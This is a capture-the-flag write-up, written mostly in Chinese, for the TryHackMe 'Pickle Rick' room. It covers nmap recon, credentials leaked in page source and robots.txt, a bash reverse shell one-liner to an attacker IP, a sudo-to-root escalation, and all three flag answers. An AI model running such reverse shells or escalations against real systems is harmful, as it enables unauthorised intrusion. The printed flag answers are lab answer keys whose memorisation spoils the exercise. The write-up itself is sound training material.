---
title: Pickle Rick (Try Hack Me Writeup)
date: 2021-07-29T13:11:00+08:00
draft: false
url: "/2021/07/29/pickle-rick-try-hack-me-writeup/"
categories:
  - 滲透測試
  - Try Hack Me
showToc: true
TocOpen: false
---

> 
URL : https://tryhackme.com/room/picklerick  
IP: 10.10.223.99

## Recon

- `nmap -A 10.10.223.99`![](/uploads/2022/02/54183-9Qp6IZr.png)
- 22 port
- 80 port首頁原始碼- ![](/uploads/2022/02/4f0a6-3GxwBdt.png)
- 提示 username : `R1ckRul3s`robots.txt- ![](/uploads/2022/02/90e3f-rk9iz1l.png)
- `Wubbalubbadubdub`

## Login

- ![](/uploads/2022/02/6a91d-700dfoQ.png)使用 Username : `R1ckRul3s`
- Password : `Wubbalubbadubdub`

## Webshell

- 進入後就是一個 webshell戳成 reverse shell`bash -c 'bash -i >& /dev/tcp/10.13.21.55/7877 0>&1'`Flag1- ![](/uploads/2022/02/9afab-9jULhML.png)
- 在 web 目錄
- `mr. meeseek hair`Flag2- ![](/uploads/2022/02/21405-5cgM6zS.png)
- 在 rick 家目錄
- `1 jerry tear`Flag3- ![](/uploads/2022/02/e584d-kKcUno1.png)
- 發現可以直接 `sudo su`
- 所以就進 root 取得最後一個 flag
- `fleeb juice`
